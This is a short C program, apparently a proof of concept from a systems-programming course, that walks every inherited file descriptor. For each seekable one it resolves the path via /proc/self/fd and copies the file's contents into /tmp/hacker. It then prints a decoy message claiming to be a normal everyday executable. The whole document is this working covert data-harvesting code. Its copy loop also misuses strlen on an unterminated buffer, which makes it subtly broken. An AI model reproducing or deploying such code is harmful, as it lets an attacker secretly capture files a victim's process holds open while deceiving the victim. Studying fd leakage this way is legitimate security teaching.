#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  int size = 1024;
  char path[size];
  char buf[size];
  for (int i = 0; i < max_fd; i++) {
    if (lseek(i, 0, 0) >= 0) {
      snprintf(path, size, "/proc/self/fd/%d", i);
      int name = readlink(path, buf, size);
      if (name < 0) {
        fprintf(stderr, "Readlink failed");
        exit(1);
      }
      buf[name] = '\0';
      printf("File descriptor: %d is %s file!\n", i, buf);
      dprintf(out, "File descriptor: %d is %s file!\n", i, buf);
      char write_buf[1024];
      while (read(i, write_buf, 1024) > 0) {
        if (write(out, write_buf, strlen(write_buf)) == -1) {
          perror("write");
          exit(1);
        }
      }
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
